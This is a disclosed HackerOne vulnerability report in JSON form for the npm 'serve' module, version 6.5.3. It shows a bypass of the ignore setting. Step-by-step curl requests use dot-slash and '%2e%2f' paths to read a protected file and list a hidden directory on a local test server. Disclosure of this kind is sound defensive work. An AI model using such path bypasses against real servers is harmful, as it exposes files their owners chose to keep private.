{
  "id": 330724,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMzA3MjQ=",
  "url": "https://hackerone.com/reports/330724",
  "title": "[serve] Directory listing and File access even when they have been set to be ignored (using dot-slash)",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2018-03-28T10:35:21.237Z",
  "submitted_at": "2018-03-28T10:35:21.237Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "tungpun",
    "url": "/tungpun",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/074/643/53db3c3da091000ce826787b75855f65371bc517_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2019-5415"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2018-05-30T13:04:31.883Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2018-05-30T13:04:20.295Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I would like to report a vulnerability in **serve**.\nIt allows listing directory and reading local files on the target server.\n\n# Module\n\n**module name:** serve\n**version:** 6.5.3\n**npm page:** `https://www.npmjs.com/package/serve`\n\n## Module Description\n\nEver wanted to share a project on your network by running just a command? Then this module is exactly what you're looking for: It provides a neat interface for listing the directory's contents and switching into sub folders.\n\nIn addition, it's also awesome when it comes to serving static sites!\n\n# Vulnerability\n\n## Steps To Reproduce:\n\n* Install serve:\n\n`$ npm i serve`\n\n* Create some child directories, files for demonstration:\n\n`$ mkdir dir`\n\n`$ echo \"This is secret content!!\" > dir/secret.txt`\n\n`$ mkdir dir/dir2`\n\n`$ touch dir/dir2/3.txt`\n\n* Create an application that uses `serve` for file serving listing and set a few folders and files in the ignore config.\n\n```\nconst serve = require('serve')\nconst server = serve(__dirname, {\n      port: 6060,\n      ignore: ['dir/secret.txt', 'dir/dir2']\n})\n```\n\n* Run the app\n\n`$ node app.js`\n\nNow, the current directory will be served by this module on port `6060` with the exception of file `dir/secret.txt` and directory `'dir/dir2`.\n\n* If we try to request these ignored files/directories, we get a Not Found error\n\n```\n$ curl --path-as-is 'http://127.0.0.1:6060/dir/secret.txt'\nNot Found\n```\n\n```\n$ curl --path-as-is 'http://127.0.0.1:6060/dir/dir2/'\nNot Found\n```\n\nor if we replace `e` character with URI encoded form `%65`, it still be ignored:\n\n```\n$ curl --path-as-is 'http://127.0.0.1:6060/dir/s%65cret.txt'\nNot Found\n```\n\n* However, I found a way to access that file by using dot-slash.\n\n```\n$ curl --path-as-is 'http://127.0.0.1:6060/dir/./secret.txt'\nThis is secret content!!\n```\n\nOr listing the directory:\n\n`http://127.0.0.1:6060/dir/%2e%2fdir2/`\n\n{F279456}\n\n## Supporting Material/References:\n\n* macOS High Sierra 10.13.3\n* node v8.10.0\n* npm 5.8.0\n* Chrome Version 65.0.3325.162 (Official Build) (64-bit)\n\n# Wrap up\n\n- I contacted the maintainer to let them know: N \n- I opened an issue in the related repository: N\n\n## Impact\n\nIt bypasses the ignore files/directories feature and allows an attacker to read a file or list the directory that the victim has not allowed access to.",
  "weakness": {
    "id": 89,
    "name": "Information Exposure Through Directory Listing"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 279456,
      "file_name": "serve2.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/279/456/a4e4c2e45fecafc065d60faaa25c8d2010083dcf/serve2.png?response-content-disposition=attachment%3B%20filename%3D%22serve2.png%22%3B%20filename%2A%3DUTF-8%27%27serve2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6VD4YZGP%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T180102Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGJKRMI%2FBz8S%2BAZJPeL0i0stznCuaVhoPPEukEzqBOOUAiEA06Un8bwL%2BDLkrxn8yZbbm0jfNvPL8%2FKuyUVe7AuBS8EqsQUIGBADGgwwMTM2MTkyNzQ4NDkiDC1H4%2Fy6C7uTkRZKyCqOBY2A2QSmExZtxVjijUeYRdWuRuLgaolNvzLO9Fq0Ufw1hyviX7ZqSKRZOr73%2FX%2B%2B%2Bf38W3rkD09pa6TYKskeJukqV9bAZLvEnTZOLMRiRjGO0dvUs4XAJi1X1vpGzxOc3WS47DK80yvy6iKWEglJNK0aaVdcVao60MI8BB%2BirdxtH9Du6iCqt2ZQfeIQSCxiJz7sYxE5uLHIr%2FR%2B5ckYKsqi6TmHKPF%2B8gZu3%2BOvpEedEMu9Opt%2FgunKq6v36mfMxZhvXQ%2B6OnzpcICD%2BggZNa%2F3xq2MKyF5t%2B44E4k%2FKsV5JOPvoqYyTy1LYhwZgpuiLwwileUnz6EFhwN6AKuOtEN46IpwfbhcXQs1evHr2u%2FviE13%2FJ4nCPLbiWS7QdRqUV43J2bi%2BksYZ1%2F7k5bPEySOoz4HLCUv1FPpwztd7yFq9o0CIC5g5%2B1p14Rs5knc%2BF4%2BLLsy0BbTAbEbEv1m7Y%2Fmvm6oSMDeW5OUTfxxBmUeOrFXR6mqlnIrF6tT9ArS57UhmqVr%2By1hRsnckwASddW0rAyMYTyovTD%2F%2F%2FVLOfv4kmA8gmw2CrwPhFmTYRPDx7h9GTGF3IG5mnTIOqnOB64jFWi%2FTuyK2suw%2FaQ%2BftkiLHU2iqkp3SvjY6BVZkIBdMt0f6vZC3%2BVofPtmfzJLGKrgLE%2BHP0d66BGai4MmLcl5zgOu7DFCqImIk5Ppb37IaWuP6z2lVMv5Ksd7Z1Ve5FjI9dLKolxpb83DxKcRRnGJvLAe6AGlVur%2FpRQkMRVgwoxNzblQ8ZD%2BKAFcaRRqjGe3%2F3NDWf5wiPdQOeBcdRdJvLEtRwNFMsuF9LpXSW7%2F0KrjvS4ECkJ37GTPZs%2BcxK1WT2rg1lgmR5ftLX%2BWjCIpsDGBjqxAcE8ostgafbi8KNq9Lx0UlekYwCtzBDaitNQE9N9Q81ULi482vwqeKLtKsyiTrAWsqQeKKJuM0zctPyPDy5y3YIbTjX26TClYy7%2B7FlQWhCiE9PCgtT1I9ds4sCP7QSm3GldpIc%2FfH2bTEcl0OWZiGcn9i7VFSwC6YqwXz5p676NfdRPyJ4HkauoUrFaoU06%2BUpLP1H0PgP8%2FEQLVxDVvJAflbUNl3w5s8djPH1CC%2FRa0w%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d64291683efb32570e15854ee563d3b34125c6c9da31c0718cb96766fe4fb251",
      "file_size": 281843,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2018-06-29T13:04:20.418Z",
  "allow_singular_disclosure_after": -228200202.30080807,
  "singular_disclosure_allowed": true,
  "vote_count": 2,
  "voters": [
    "bl4de",
    "eveeez"
  ],
  "severity": {
    "rating": "critical",
    "score": 9.3,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "high",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 5006,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "serve",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
